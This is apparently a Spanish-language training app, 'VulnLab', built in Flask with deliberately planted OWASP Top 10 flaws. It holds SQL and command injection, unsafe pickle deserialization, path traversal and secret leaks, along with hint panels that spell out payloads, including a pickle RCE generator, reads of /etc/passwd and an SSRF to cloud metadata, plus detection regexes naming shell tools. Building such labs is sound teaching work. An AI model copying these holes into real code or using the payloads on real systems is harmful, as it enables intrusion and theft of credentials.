"""
Máquina vulnerable para práctica de pentesting.
ADVERTENCIA: Solo para uso en entornos controlados/educativos.
NUNCA desplegar en producción o redes públicas.
"""
import sqlite3
import subprocess
import os
import pickle
import base64
import logging
import urllib.request
import re
import json
from collections import defaultdict
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, session, jsonify, render_template
from flask_cors import CORS
import base64
from weasyprint import HTML

# El archivo PDF ha sido compilado a través del motor WeasyPrint procesando el marcado semántico HTML e inline CSS estructurado.
# Para revisiones subsiguientes o modificaciones de los vectores descritos, conserve la referencia del tag asignado en la salida del sistema.

app = Flask(__name__)
CORS(app)
app.secret_key = "supersecret123"  # Vuln: clave débil hardcodeada

# ─── Sistema de auditoría en tiempo real ──────────────────────────────────────

_bf_counter: dict = defaultdict(int)  # {ip: count} para brute force

VULN_SIGNATURES = [
    ("SQL_INJECTION",       "CRITICO", "A03",
     re.compile(r"(?i)('|\%27)\s*(or|and|union|select)|union\s+select|or\s+'?\d+'?\s*=\s*'?\d+'?|--\s|#\s*$", re.I)),
    ("XSS",                 "ALTO",    "A03",
     re.compile(r"(?i)<script|onerror\s*=|onload\s*=|javascript:|<svg|alert\s*\(|<img[^>]+onerror")),
    ("CMD_INJECTION",       "CRITICO", "A03",
     re.compile(r"(?i)(;\s*(id|whoami|ls|cat|env|bash|sh|nc|wget|curl|uname|passwd)(\s|$))|(&&\s*\w)|(``)|(\|\s*(cat|id|ls|bash))")),
    ("PATH_TRAVERSAL",      "ALTO",    "A05",
     re.compile(r"\.\.[/\\]|%2e%2e")),
    ("SSRF",                "ALTO",    "A10",
     re.compile(r"(?i)(file://)|(127\.\d+\.\d+\.\d+)|(0\.0\.0\.0)|(169\.254)|(::1)|(localhost(?!:8080))|(metadata\.google)")),
]

ENDPOINT_VULNS = {
    "/info":        ("INFO_DISCLOSURE",   "CRITICO", "A05", "Acceso a configuración sensible del servidor"),
    "/deserialize": ("DESERIALIZATION",   "CRITICO", "A08", "Pickle recibido — posible RCE"),
    "/api/users":   ("BROKEN_AUTH_API",   "ALTO",    "A07", "Acceso a listado de usuarios"),
    "/crypto":      ("CRYPTO_FAILURE",    "CRITICO", "A02", "Contraseñas en texto plano expuestas"),
    "/components":  ("VULN_COMPONENTS",   "MEDIO",   "A06", "Versiones de componentes expuestas al cliente"),
    "/reset":       ("INSECURE_DESIGN",   "ALTO",    "A04", "Token de reset predecible accedido"),
}

def _emit_alert(vuln_type: str, severity: str, owasp: str, payload: str, extra: str = ""):
    entry = {
        "ts":       datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
        "ip":       request.remote_addr or "unknown",
        "method":   request.method,
        "endpoint": request.path,
        "type":     vuln_type,
        "severity": severity,
        "owasp":    owasp,
        "payload":  payload[:120],
        "detail":   extra,
    }
    print(f"[VULN_ALERT] {json.dumps(entry, ensure_ascii=False)}", flush=True)


@app.before_request
def audit_request():
    ip = request.remote_addr or "unknown"

    if request.path in ENDPOINT_VULNS and request.method == "GET":
        vtype, sev, owasp, detail = ENDPOINT_VULNS[request.path]
        _emit_alert(vtype, sev, owasp, request.full_path, detail)

    if request.path == "/deserialize" and request.method == "POST":
        vtype, sev, owasp, detail = ENDPOINT_VULNS["/deserialize"]
        try:
            payload_preview = request.form.get("data", "")[:40]
        except Exception:
            payload_preview = "<binary>"
        _emit_alert(vtype, sev, owasp, payload_preview, detail)

    if request.path == "/auth" and request.method == "POST":
        _bf_counter["auth_" + ip] += 1
        if _bf_counter["auth_" + ip] >= 5:
            _emit_alert(
                "BRUTE_FORCE", "ALTO", "A07",
                request.form.get("username", "")[:20],
                f"Intento #{_bf_counter['auth_' + ip]} en /auth desde {ip}"
            )

    if request.path in ("/admin", "/admin-safe"):
        _bf_counter[ip] += 1
        if _bf_counter[ip] >= 3:
            _emit_alert(
                "BRUTE_FORCE", "MEDIO", "A09",
                request.args.get("password", "")[:20],
                f"Intento #{_bf_counter[ip]} desde {ip}"
            )

    inputs: dict = {}
    inputs.update(request.args.to_dict())
    try:
        inputs.update(request.form.to_dict())
    except Exception:
        pass

    try:
        f = request.files.get("file")
        if f and f.filename:
            inputs["__filename__"] = f.filename
    except Exception:
        pass

    seen: set = set()
    for param, value in inputs.items():
        for vtype, sev, owasp, pattern in VULN_SIGNATURES:
            if pattern.search(str(value)) and vtype not in seen:
                seen.add(vtype)
                extra = f"param={param}"
                if vtype == "PATH_TRAVERSAL":
                    extra = f"filename={value}"
                _emit_alert(vtype, sev, owasp, str(value)[:120], extra)

    if request.path == "/notes" and "id" in request.args:
        note_id = request.args.get("id", "")
        user_in_session = session.get("user_id")
        if user_in_session is None:
            _emit_alert("IDOR", "ALTO", "A01",
                        f"id={note_id}", "Acceso a nota sin sesión autenticada")

DB_PATH = os.environ.get("DB_PATH", "users.db")

# ─── Setup base de datos ───────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT,
            email TEXT
        );
        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            content TEXT
        );
        INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123', 'admin', 'admin@lab.local');
        INSERT OR IGNORE INTO users VALUES (2, 'alice', 'password', 'user', 'alice@lab.local');
        INSERT OR IGNORE INTO users VALUES (3, 'bob', 'bob123', 'user', 'bob@lab.local');
        INSERT OR IGNORE INTO notes VALUES (1, 1, 'Flag secreta: FLAG{sql_injection_found}');
        INSERT OR IGNORE INTO notes VALUES (2, 2, 'Nota de Alice');
        INSERT OR IGNORE INTO notes VALUES (3, 3, 'Nota de Bob');
    """)
    conn.commit()
    conn.close()


# ─── Pistas por página ────────────────────────────────────────────────────────

HINTS = {
    "index": "",
    "login": """
<p>La query se construye concatenando el input directamente:</p>
<pre>SELECT * FROM users
WHERE username='INPUT'
AND password='INPUT'</pre>
<p>Prueba en el campo usuario:</p>
<pre>' OR '1'='1</pre>
<pre>admin'--</pre>
<p>El comentario <code>--</code> anula la condición de contraseña.</p>
""",
    "search": """
<p>La búsqueda es vulnerable a dos ataques distintos:</p>
<p><strong>SQL Injection</strong> — el parámetro <code>q</code> se inserta sin sanitizar:</p>
<pre>' UNION SELECT 1,username,3,4,password FROM users--</pre>
<p><strong>XSS Reflejado</strong> — el resultado usa <code>|safe</code> en el template, desactivando el escape:</p>
<pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
<pre>&lt;img src=x onerror=alert(1)&gt;</pre>
""",
    "ping": """
<p>La app ejecuta literalmente:</p>
<pre>ping -c 1 &lt;tu input&gt;</pre>
<p>con <code>shell=True</code>, por lo que cualquier operador de shell funciona:</p>
<pre>127.0.0.1; id</pre>
<pre>127.0.0.1 &amp;&amp; whoami</pre>
<pre>127.0.0.1; cat /flag.txt</pre>
<pre>127.0.0.1; cat /etc/passwd</pre>
<p>El flag RCE está en <code>/flag.txt</code>.</p>
""",
    "notes": """
<p>El servidor obtiene la nota por ID sin verificar que pertenezca al usuario autenticado:</p>
<pre>SELECT * FROM notes WHERE id=&lt;tu input&gt;</pre>
<p>Cambia el parámetro <code>id</code> en la URL:</p>
<pre>/notes?id=1  → nota del admin (tiene flag)
/notes?id=2  → nota de Alice
/notes?id=3  → nota de Bob</pre>
<p>No necesitas sesión activa para acceder a cualquier nota.</p>
""",
    "upload": """
<p>Tres vulnerabilidades combinables:</p>
<p><strong>1. Sin validación de extensión</strong><br>El servidor acepta cualquier archivo. Sube:</p>
<pre>shell.py
backdoor.sh
webshell.php</pre>
<p><strong>2. Path Traversal</strong><br>Renombra el archivo localmente antes de subirlo:</p>
<pre>../../../tmp/pwned.txt</pre>
<p>El servidor usa <code>os.path.join(UPLOAD_DIR, filename)</code> sin limpiar el nombre.</p>
<p><strong>3. Sin límite de tamaño</strong><br>Sube un archivo arbitrariamente grande para agotar el disco.</p>
""",
    "deserialize": """
<p>El servidor llama <code>pickle.loads(data)</code> sin ninguna validación. El método <code>__reduce__</code> se ejecuta durante la deserialización.</p>
<p>Genera un payload en tu terminal:</p>
<pre>python3 -c "
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system,
          ('id &gt; /tmp/pwned.txt',))
print(base64.b64encode(
  pickle.dumps(RCE())).decode())
"</pre>
<p>Pega el resultado en el campo y haz clic en Deserializar.</p>
<p>Verifica el resultado en <a href="/ping">/ping</a> con: <code>127.0.0.1; cat /tmp/pwned.txt</code></p>
""",
    "admin": """
<p>El endpoint <code>/admin</code> no registra ningún intento de acceso. Puedes hacer fuerza bruta sin dejar rastro.</p>
<p>La contraseña tiene 8 caracteres, es débil y está hardcodeada en el código.</p>
<p>Compara con <code>/admin-safe</code>: ese endpoint sí escribe en <code>/tmp/security.log</code>.</p>
<p>Puedes verificar los logs de la versión segura en:</p>
<pre>GET /api/logs</pre>
""",
    "fetch": """
<p>La app fetcha cualquier URL sin validación de host ni esquema.</p>
<p><strong>Acceso a servicios internos:</strong></p>
<pre>http://127.0.0.1:5000/info</pre>
<pre>http://127.0.0.1:5000/api/users</pre>
<p><strong>Lectura de archivos locales:</strong></p>
<pre>file:///etc/passwd</pre>
<pre>file:///flag.txt</pre>
<p><strong>Metadata de cloud (si corre en AWS/GCP):</strong></p>
<pre>http://169.254.169.254/latest/meta-data/</pre>
""",
    "crypto": """
<p>Las contraseñas se almacenan en <strong>texto plano</strong> en SQLite. No hay ningún tipo de hashing.</p>
<p>Cualquier dump de la BD expone todas las credenciales directamente.</p>
<p>El correcto sería:</p>
<pre>import bcrypt
hash = bcrypt.hashpw(
  password.encode(),
  bcrypt.gensalt()
)</pre>
<p>Además, el servidor no fuerza HTTPS, por lo que las credenciales viajan sin cifrar.</p>
<p>Compara: <code>/info</code> también expone la <code>secret_key</code> de Flask, lo que permite falsificar cookies de sesión.</p>
""",
    "reset": """
<p>El token de reset es simplemente el <strong>ID del usuario</strong> — completamente predecible.</p>
<p><strong>Ataque paso a paso:</strong></p>
<p>1. Solicita reset para cualquier usuario conocido:</p>
<pre>POST /reset
action=request&username=admin</pre>
<p>2. El token devuelto es <code>1</code> (ID del admin).</p>
<p>3. Usa ese token para cambiar la contraseña:</p>
<pre>POST /reset
action=use&token=1
&new_password=hacked123</pre>
<p>Un token seguro debe ser aleatorio, de un solo uso, y con expiración corta (&lt;15 min).</p>
""",
    "components": """
<p>Este endpoint expone todas las versiones de los paquetes instalados. Con eso, un atacante puede:</p>
<ol style="padding-left:16px;margin-bottom:12px">
  <li>Identificar versiones exactas</li>
  <li>Buscar CVEs conocidos en NVD</li>
  <li>Explotar vulnerabilidades específicas de esa versión</li>
</ol>
<p>Herramientas de auditoría de dependencias:</p>
<pre>pip-audit
safety check
snyk test</pre>
<p>Busca CVEs en:</p>
<pre>https://nvd.nist.gov/vuln/search</pre>
""",
    "auth": """
<p>El endpoint <code>/auth</code> no tiene ninguna protección contra fuerza bruta:</p>
<p>· Sin bloqueo de cuenta (lockout)<br>· Sin CAPTCHA<br>· Sin rate limiting<br>· Sin delay progresivo</p>
<p>Prueba con un bucle:</p>
<pre>for i in $(seq 1 100); do
  curl -s -X POST http://localhost:8080/auth \\
    -d "username=admin&password=test${i}"
done</pre>
<p>La contraseña del admin es débil (8 caracteres). También funciona vía API con token hardcodeado:</p>
<pre>curl /api/users \\
  -H "X-Token: token123"</pre>
""",
}

# Token store para /reset (A04)
_reset_tokens: dict = {}

# ─── Layout compartido ─────────────────────────────────────────────────────────

_H = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VulnLab</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d0d0d;--sur:#161616;--bdr:#2a2a2a;
  --tx:#d4d4d8;--mu:#52525b;
  --ok:#22c55e;--err:#ef4444;--warn:#f59e0b;--blue:#60a5fa;
  --r:6px;
  --f:'SF Mono','Fira Code','Cascadia Code',ui-monospace,monospace
}
body{background:var(--bg);color:var(--tx);font-family:var(--f);font-size:13px;line-height:1.7;min-height:100vh}
header{position:sticky;top:0;z-index:10;background:var(--sur);border-bottom:1px solid var(--bdr);height:48px;padding:0 24px;display:flex;align-items:center;gap:28px}
.logo{color:var(--ok);font-weight:700;font-size:14px;letter-spacing:.05em;text-decoration:none}
.logo::before{content:'▶ '}
nav{display:flex;gap:2px;flex-wrap:wrap}
nav a{color:var(--mu);text-decoration:none;padding:4px 10px;border-radius:var(--r);font-size:11px;transition:color .1s,background .1s}
nav a:hover{color:var(--tx);background:#222}
nav a.hi{color:var(--ok);background:#0a1a10}
main{max-width:720px;margin:48px auto;padding:0 24px 64px}
.pt{font-size:18px;font-weight:700;color:#fff;margin-bottom:4px}
.ps{color:var(--mu);font-size:11px;margin-bottom:28px}
.card{background:var(--sur);border:1px solid var(--bdr);border-radius:var(--r);padding:24px;margin-bottom:16px}
.badge{display:inline-block;padding:2px 8px;border-radius:99px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase}
.bc{background:#450a0a;color:#fca5a5}
.bh{background:#431407;color:#fdba74}
.bm{background:#422006;color:#fde68a}
.bi{background:#082f49;color:#93c5fd}
.alert{padding:10px 14px;border-radius:var(--r);margin-bottom:16px;font-size:12px;border-left:3px solid}
.aok{background:#052e16;border-color:var(--ok);color:#86efac}
.aerr{background:#450a0a;border-color:var(--err);color:#fca5a5}
.awk{background:#451a03;border-color:var(--warn);color:#fcd34d}
.field{margin-bottom:16px}
label{display:block;font-size:10px;color:var(--mu);letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px}
input[type=text],input[type=password],input[type=url],input[type=file],textarea,select{display:block;width:100%;padding:8px 12px;background:var(--bg);border:1px solid var(--bdr);border-radius:var(--r);color:var(--tx);font-family:var(--f);font-size:13px;outline:none;transition:border-color .15s}
input:focus,textarea:focus{border-color:var(--ok)}
input[type=file]{padding:6px 10px;color:var(--mu);cursor:pointer}
textarea{resize:vertical;min-height:90px}
button,input[type=submit]{display:inline-block;padding:8px 20px;background:var(--ok);color:#050f08;border:none;border-radius:var(--r);font-family:var(--f);font-size:12px;font-weight:700;cursor:pointer;letter-spacing:.05em;transition:opacity .1s}
button:hover{opacity:.85}
.btn-g{background:transparent;border:1px solid var(--bdr);color:var(--mu);padding:6px 14px;border-radius:var(--r);font-family:var(--f);font-size:11px;cursor:pointer;text-decoration:none;display:inline-block;transition:border-color .1s,color .1s}
.btn-g:hover{border-color:var(--tx);color:var(--tx)}
pre{background:#0a0a0a;border:1px solid var(--bdr);border-radius:var(--r);padding:16px;overflow-x:auto;font-family:var(--f);font-size:12px;color:#a1a1aa;white-space:pre-wrap;word-break:break-all;margin-bottom:12px}
code{font-family:var(--f);font-size:12px;background:#1a1a1a;border:1px solid var(--bdr);border-radius:4px;padding:1px 6px;color:var(--blue)}
ul.vl{list-style:none;display:flex;flex-direction:column;gap:8px}
ul.vl li a{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:var(--sur);border:1px solid var(--bdr);border-radius:var(--r);text-decoration:none;color:var(--tx);font-size:13px;transition:border-color .12s,background .12s}
ul.vl li a:hover{border-color:var(--ok);background:#111}
ul.vl li a .vm{font-size:10px;color:var(--mu);text-align:right}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:8px 12px;border-bottom:1px solid var(--bdr);color:var(--mu);font-size:10px;text-transform:uppercase;letter-spacing:.08em}
td{padding:10px 12px;border-bottom:1px solid #1a1a1a}
tr:last-child td{border-bottom:none}
tr:hover td{background:#1a1a1a}
a{color:var(--blue)}
a:hover{color:#93c5fd}
hr{border:none;border-top:1px solid var(--bdr);margin:24px 0}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#3f3f46;border-radius:2px}

/* ── Panel de pistas ── */
.hp{position:fixed;top:0;left:0;width:300px;height:100vh;background:#0f0f0f;border-right:1px solid var(--bdr);transform:translateX(-100%);transition:transform .25s cubic-bezier(.4,0,.2,1);z-index:200;display:flex;flex-direction:column}
.hp.open{transform:translateX(0)}
.hp-hd{padding:16px 20px;border-bottom:1px solid var(--bdr);display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.hp-title{font-size:10px;font-weight:700;color:var(--mu);text-transform:uppercase;letter-spacing:.1em}
.hp-close{background:none;border:none;color:var(--mu);font-size:18px;cursor:pointer;padding:0;line-height:1;transition:color .1s}
.hp-close:hover{color:var(--tx);opacity:1}
.hp-body{padding:20px;overflow-y:auto;flex:1;font-size:12px;line-height:1.85;color:#a1a1aa}
.hp-body p{margin-bottom:12px;color:#a1a1aa}
.hp-body strong{color:var(--tx)}
.hp-body a{color:var(--blue)}
.hp-body pre{font-size:11px;padding:12px 14px}
.hp-body code{font-size:11px}
.hp-empty{color:var(--mu);font-size:12px;text-align:center;margin-top:40px}

/* ── Backdrop ── */
.hb{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:199;display:none;backdrop-filter:blur(1px)}
.hb.open{display:block}

/* ── FAB ── */
.fab{position:fixed;bottom:28px;left:28px;width:48px;height:48px;border-radius:50%;background:var(--ok);color:#050f08;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;z-index:201;box-shadow:0 4px 16px rgba(34,197,94,.35);transition:transform .15s,box-shadow .15s;font-family:var(--f);font-size:18px;font-weight:700;padding:0}
.fab:hover{transform:scale(1.1);box-shadow:0 6px 24px rgba(34,197,94,.5);opacity:1}
</style>
</head>
<body>

<!-- Panel de pistas -->
<div class="hb" id="hb" onclick="closeHint()"></div>
<aside class="hp" id="hp">
  <div class="hp-hd">
    <span class="hp-title">Pistas</span>
    <button class="hp-close" onclick="closeHint()">×</button>
  </div>
  <div class="hp-body" id="hp-body">
    {{ hint|safe if hint else '<p class="hp-empty">No hay pistas para esta página.</p>' }}
  </div>
</aside>

<!-- FAB -->
{% if hint %}
<button class="fab" id="fab" onclick="openHint()" title="Ver pistas">?</button>
{% endif %}

<script>
function openHint(){
  document.getElementById('hp').classList.add('open');
  document.getElementById('hb').classList.add('open');
  document.getElementById('fab').style.display='none';
}
function closeHint(){
  document.getElementById('hp').classList.remove('open');
  document.getElementById('hb').classList.remove('open');
  var f=document.getElementById('fab');
  if(f) f.style.display='flex';
}
document.addEventListener('keydown',function(e){if(e.key==='Escape') closeHint();});
</script>

<header>
  <a href="/" class="logo">VulnLab</a>
  <nav>
    <a href="/login">SQLi</a>
    <a href="/search">XSS</a>
    <a href="/ping">CMDi</a>
    <a href="/notes">IDOR</a>
    <a href="/crypto">Crypto</a>
    <a href="/upload">Upload</a>
    <a href="/components">Deps</a>
    <a href="/auth">Auth</a>
    <a href="/reset">Reset</a>
    <a href="/deserialize">Pickle</a>
    <a href="/admin">Logging</a>
    <a href="/fetch">SSRF</a>
    <a href="/dashboard" style="color:var(--ok)">Dashboard ↗</a>
  </nav>
</header>
<main>
"""

_F = """
</main>
</body>
</html>"""


# ─── Página principal ──────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template_string(_H + """
<div class="pt">VulnLab — Máquina de Práctica</div>
<div class="ps">Entorno educativo · OWASP Top 10 · Solo uso controlado</div>
<ul class="vl">
  <li><a href="/notes"><span>Notas — IDOR</span><span class="vm"><span class="badge bh">ALTO</span><br>A01 · Broken Access Control</span></a></li>
  <li><a href="/crypto"><span>Crypto — Contraseñas en texto plano</span><span class="vm"><span class="badge bc">CRÍTICO</span><br>A02 · Cryptographic Failures</span></a></li>
  <li><a href="/login"><span>Login — SQL Injection</span><span class="vm"><span class="badge bc">CRÍTICO</span><br>A03 · Injection</span></a></li>
  <li><a href="/search"><span>Búsqueda — SQLi + XSS Reflejado</span><span class="vm"><span class="badge bc">CRÍTICO</span><br>A03 · Injection</span></a></li>
  <li><a href="/ping"><span>Ping — Command Injection</span><span class="vm"><span class="badge bc">CRÍTICO</span><br>A03 · Injection</span></a></li>
  <li><a href="/reset"><span>Reset — Token predecible</span><span class="vm"><span class="badge bh">ALTO</span><br>A04 · Insecure Design</span></a></li>
  <li><a href="/info"><span>Info del servidor — Info Disclosure</span><span class="vm"><span class="badge bh">ALTO</span><br>A05 · Misconfiguration</span></a></li>
  <li><a href="/upload"><span>Subida de archivos — Path Traversal</span><span class="vm"><span class="badge bh">ALTO</span><br>A05 · Misconfiguration</span></a></li>
  <li><a href="/components"><span>Dependencias — Versiones expuestas</span><span class="vm"><span class="badge bm">MEDIO</span><br>A06 · Vulnerable Components</span></a></li>
  <li><a href="/auth"><span>Auth — Sin bloqueo de cuenta</span><span class="vm"><span class="badge bh">ALTO</span><br>A07 · Auth Failures</span></a></li>
  <li><a href="/deserialize"><span>Deserialización — Pickle RCE</span><span class="vm"><span class="badge bc">CRÍTICO</span><br>A08 · Integrity Failure</span></a></li>
  <li><a href="/admin"><span>Admin — Sin logging de seguridad</span><span class="vm"><span class="badge bm">MEDIO</span><br>A09 · Logging Failure</span></a></li>
  <li><a href="/fetch"><span>Visor de URLs — SSRF</span><span class="vm"><span class="badge bh">ALTO</span><br>A10 · SSRF</span></a></li>
</ul>
<div style="margin-top:24px;text-align:center">
  <a href="/dashboard" style="display:inline-block;padding:10px 28px;background:var(--ok);color:#050f08;border-radius:var(--r);font-weight:700;font-size:13px;text-decoration:none">
    Abrir Dashboard interactivo →
  </a>
</div>
""" + _F, hint=HINTS["index"])


# ─── VULNERABILIDAD 1: SQL Injection en login ──────────────────────────────────

LOGIN_TEMPLATE = _H + """
<div class="pt">Login</div>
<div class="ps">A03 · Injection — SQL Injection en autenticación</div>
{% if error %}<div class="alert aerr">{{ error }}</div>{% endif %}
{% if user %}<div class="alert aok">Bienvenido: <strong>{{ user }}</strong></div>{% endif %}
<div class="card">
  <form method="POST">
    <div class="field"><label>Usuario</label><input type="text" name="username" autocomplete="off"></div>
    <div class="field"><label>Contraseña</label><input type="password" name="password"></div>
    <button type="submit">Iniciar sesión</button>
  </form>
</div>
""" + _F

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    user = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        conn = sqlite3.connect(DB_PATH)
        # VULNERABLE: concatenación directa sin sanitizar
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        try:
            row = conn.execute(query).fetchone()
            if row:
                session["user_id"] = row[0]
                session["role"] = row[3]
                user = row[1]
            else:
                error = "Credenciales incorrectas"
        except Exception as e:
            error = f"Error DB: {e}"
        conn.close()
    return render_template_string(LOGIN_TEMPLATE, error=error, user=user, hint=HINTS["login"])


# ─── VULNERABILIDAD 2: SQL Injection + XSS reflejado en búsqueda ──────────────

SEARCH_TEMPLATE = _H + """
<div class="pt">Búsqueda de usuarios</div>
<div class="ps">A03 · Injection — SQL Injection + XSS Reflejado</div>
<div class="card">
  <form method="GET">
    <div class="field"><label>Término de búsqueda</label><input type="text" name="q" value="{{ query }}" autocomplete="off"></div>
    <button type="submit">Buscar</button>
  </form>
</div>
{% if query %}
<div class="card" style="margin-top:0">
  <div style="font-size:11px;color:var(--mu);margin-bottom:12px">Resultados para: {{ query|safe }}</div>
  {% if results %}
  <table>
    <tr><th>#</th><th>Usuario</th><th>Email</th></tr>
    {% for r in results %}<tr><td>{{ r[0] }}</td><td>{{ r[1] }}</td><td>{{ r[4] }}</td></tr>{% endfor %}
  </table>
  {% else %}
  <p style="color:var(--mu);font-size:12px">Sin resultados.</p>
  {% endif %}
</div>
{% endif %}
""" + _F

@app.route("/search")
def search():
    q = request.args.get("q", "")
    results = []
    if q:
        conn = sqlite3.connect(DB_PATH)
        # VULNERABLE: SQLi Y el template usa |safe (XSS)
        try:
            results = conn.execute(
                f"SELECT * FROM users WHERE username LIKE '%{q}%'"
            ).fetchall()
        except Exception:
            pass
        conn.close()
    return render_template_string(SEARCH_TEMPLATE, query=q, results=results, hint=HINTS["search"])


# ─── VULNERABILIDAD 3: Command Injection ──────────────────────────────────────

PING_TEMPLATE = _H + """
<div class="pt">Utilidad Ping</div>
<div class="ps">A03 · Injection — Command Injection (shell=True)</div>
<div class="card">
  <form method="POST">
    <div class="field"><label>Host o IP</label><input type="text" name="host" value="{{ host }}" placeholder="127.0.0.1" autocomplete="off"></div>
    <button type="submit">Ejecutar ping</button>
  </form>
</div>
{% if output %}
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:8px;text-transform:uppercase;letter-spacing:.08em">Salida</div>
  <pre>{{ output }}</pre>
</div>
{% endif %}
""" + _F

@app.route("/ping", methods=["GET", "POST"])
def ping():
    output = ""
    host = ""
    if request.method == "POST":
        host = request.form.get("host", "")
        # VULNERABLE: shell=True con input del usuario
        try:
            result = subprocess.run(
                f"ping -c 1 {host}",
                shell=True, capture_output=True, text=True, timeout=5
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "Timeout"
    return render_template_string(PING_TEMPLATE, output=output, host=host, hint=HINTS["ping"])


# ─── VULNERABILIDAD 4: IDOR (Insecure Direct Object Reference) ────────────────

@app.route("/notes")
def notes():
    note_id = request.args.get("id", "1")
    conn = sqlite3.connect(DB_PATH)
    # VULNERABLE: sin verificar que el user_id coincide con la sesión
    note = conn.execute(f"SELECT * FROM notes WHERE id={note_id}").fetchone()
    conn.close()
    content = note[2] if note else "Nota no encontrada"
    return render_template_string(_H + """
<div class="pt">Notas</div>
<div class="ps">A01 · Broken Access Control — IDOR</div>
<div class="card">
  <div style="font-size:10px;color:var(--mu);margin-bottom:6px;text-transform:uppercase;letter-spacing:.08em">Nota #{{ id }}</div>
  <div style="font-size:14px">{{ content }}</div>
</div>
<div style="display:flex;gap:8px">
  <a href="/notes?id=1" class="btn-g">Nota #1</a>
  <a href="/notes?id=2" class="btn-g">Nota #2</a>
  <a href="/notes?id=3" class="btn-g">Nota #3</a>
</div>
""" + _F, id=note_id, content=content, hint=HINTS["notes"])


# ─── VULNERABILIDAD 5: Exposición de info sensible ────────────────────────────

@app.route("/info")
def info():
    # VULNERABLE: expone variables de entorno y rutas del sistema
    return jsonify({
        "python_path": os.sys.executable,
        "cwd": os.getcwd(),
        "env": dict(os.environ),       # nunca hacer esto
        "db_path": os.path.abspath(DB_PATH),
        "secret_key": app.secret_key,  # exponer la secret key
        "users_file": "/etc/passwd",
    })


# ─── VULNERABILIDAD 6: Subida de archivos sin validación (A05) ────────────────

UPLOAD_DIR = os.environ.get("UPLOAD_DIR", "/tmp/uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

ALLOWED_EXTENSIONS = {".png", ".jpg", ".jpeg", ".gif", ".pdf", ".txt"}

@app.route("/upload", methods=["GET", "POST"])
def upload():
    msg = ""
    saved_path = ""
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            # VULNERABLE 1: no valida extensión — acepta .py .sh .php etc.
            # VULNERABLE 2: path traversal — filename="../../../etc/cron.d/backdoor"
            # VULNERABLE 3: no limita tamaño del archivo
            save_path = os.path.join(UPLOAD_DIR, f.filename)
            f.save(save_path)
            saved_path = save_path
            msg = f"Archivo guardado en {save_path}"
        else:
            msg = "No se recibió archivo"
    return render_template_string(_H + """
<div class="pt">Subida de archivos</div>
<div class="ps">A05 · Security Misconfiguration — Sin validación de tipo ni path traversal</div>
<div class="card">
  <form method="POST" enctype="multipart/form-data">
    <div class="field"><label>Archivo</label><input type="file" name="file"></div>
    <button type="submit">Subir archivo</button>
  </form>
</div>
{% if msg %}
<div class="alert {% if saved_path %}aok{% else %}awk{% endif %}">
  {{ msg }}{% if saved_path %}<br><code>{{ saved_path }}</code>{% endif %}
</div>
{% endif %}
""" + _F, msg=msg, saved_path=saved_path, allowed=", ".join(ALLOWED_EXTENSIONS), hint=HINTS["upload"])


# ─── API vulnerable: autenticación débil ──────────────────────────────────────

@app.route("/api/users")
def api_users():
    token = request.headers.get("X-Token", "")
    # VULNERABLE: token fijo hardcodeado
    if token != "token123":
        return jsonify({"error": "Unauthorized"}), 401
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute("SELECT id, username, email, role FROM users").fetchall()
    conn.close()
    return jsonify([{"id": r[0], "username": r[1], "email": r[2], "role": r[3]} for r in rows])


# ─── VULNERABILIDAD 7: Deserialización insegura (A08) ─────────────────────────

DESERIALIZE_TEMPLATE = _H + """
<div class="pt">Deserialización insegura</div>
<div class="ps">A08 · Software and Data Integrity Failures — Pickle RCE</div>
<div class="card">
  <form method="POST">
    <div class="field">
      <label>Objeto serializado en Base64 (pickle)</label>
      <textarea name="data" rows="4" placeholder="Pega aquí el payload base64...">{{ data }}</textarea>
    </div>
    <button type="submit">Deserializar</button>
  </form>
</div>
{% if result %}
<div class="card" style="margin-top:0">
  <div style="font-size:10px;color:var(--mu);margin-bottom:8px;text-transform:uppercase;letter-spacing:.08em">Resultado</div>
  <pre>{{ result }}</pre>
</div>
{% endif %}
""" + _F

@app.route("/deserialize", methods=["GET", "POST"])
def deserialize():
    result = ""
    data = ""
    if request.method == "POST":
        data = request.form.get("data", "").strip()
        if data:
            try:
                raw = base64.b64decode(data)
                # VULNERABLE: pickle.loads ejecuta __reduce__ del objeto arbitrario → RCE
                obj = pickle.loads(raw)
                result = f"Objeto deserializado: {repr(obj)}"
            except Exception as e:
                result = f"Error al deserializar: {e}"
    return render_template_string(DESERIALIZE_TEMPLATE, result=result, data=data, hint=HINTS["deserialize"])


# ─── VULNERABILIDAD 8: Sin logging de seguridad (A09) ─────────────────────────

security_logger = logging.getLogger("security")
security_logger.setLevel(logging.INFO)
_handler = logging.FileHandler("/tmp/security.log")
_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
